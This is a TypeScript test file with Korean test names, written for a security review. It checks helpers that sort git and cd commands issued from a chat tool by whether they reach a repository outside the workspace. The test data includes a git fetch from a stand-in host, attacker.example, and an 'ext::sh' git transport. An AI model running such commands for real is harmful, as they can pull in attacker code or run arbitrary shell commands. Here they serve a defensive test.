import { describe, expect, it } from 'vitest'
import { commandKind } from './chat-auto.js'
import { cdBases, gitNewPlace } from './chat-place.js'

describe('새 자리와 주고받는 git (11/27 보안 검토)', () => {
  it('받기의 저장소 자리가 이름이 아니면 새 자리', () => {
    for (const rest of [['https://x.example/r'], ['--depth', '1', 'https://x.example/r'], ['git@host:x/y'], ['../other'], ['/abs/repo'], ['--', 'file:///r'], ['-j', '4', 'ext::sh']]) expect(gitNewPlace('fetch', rest), rest.join(' ')).toBe(true)
    for (const rest of [[], ['origin'], ['--all'], ['--prune', 'origin'], ['--depth', '1', 'origin'], ['origin', 'main:main'], ['my.fork', 'feature/x']]) expect(gitNewPlace('pull', rest), rest.join(' ')).toBe(false)
    expect(gitNewPlace('remote', ['add', 'o', 'u'])).toBe(true)
    expect(gitNewPlace('remote', ['-v'])).toBe(false)
    expect(gitNewPlace('push', ['https://x'])).toBe(false)
  })
  it('commandKind: 새 주소로 받기는 밖, 이름으로 받기는 편집', () => {
    const k = (c: string) => commandKind(c, { cwd: '/w/p', inside: (a) => a === '/w/p' || a.startsWith('/w/p/') })
    expect(k('git fetch "https://attacker.example/x"')).toBe('outside')
    expect(k('git -C . pull ../other main')).toBe('outside')
    expect(k('git fetch origin')).toBe('edit')
  })
})

describe('줄 안의 cd 자리', () => {
  it('cd 를 이어 붙이고, 절대 경로 · ~ 는 그대로', () => {
    expect(cdBases('cd notes && cd sub; cp a b', '/w/p', '/h')).toEqual(['/w/p/notes', '/w/p/notes/sub'])
    expect(cdBases('cd /abs && ls; pushd ~/x', '/w/p', '/h')).toEqual(['/abs', '/h/x'])
    expect(cdBases('cd - ; ls', '/w/p', '/h')).toEqual([])
  })
  it('every: 경로 모양이 아닌 낱말도 inside 에 묻고, 상대 경로는 cd 자리에서도 본다 (.. 를 풀기 전의 글과 함께)', () => {
    const seen: string[] = []
    const kind = commandKind('cd notes && cp x h/y', { cwd: '/w/p', every: true, bases: cdBases('cd notes && cp x h/y', '/w/p', '/h'), inside: (abs, raw) => { seen.push(raw ?? abs); return !(raw ?? abs).includes('/notes/h/') } })
    expect(kind).toBe('outside')
    expect(seen).toContain('/w/p/notes/h/y')
    expect(seen).toContain('/w/p/h/y')
    // every 가 아니면 경로 모양(/ ~ ..)만 본다: 전과 같다
    const plain: string[] = []
    commandKind('cp x h/y', { cwd: '/w/p', inside: (abs) => { plain.push(abs); return true } })
    expect(plain).toEqual([])
  })
})
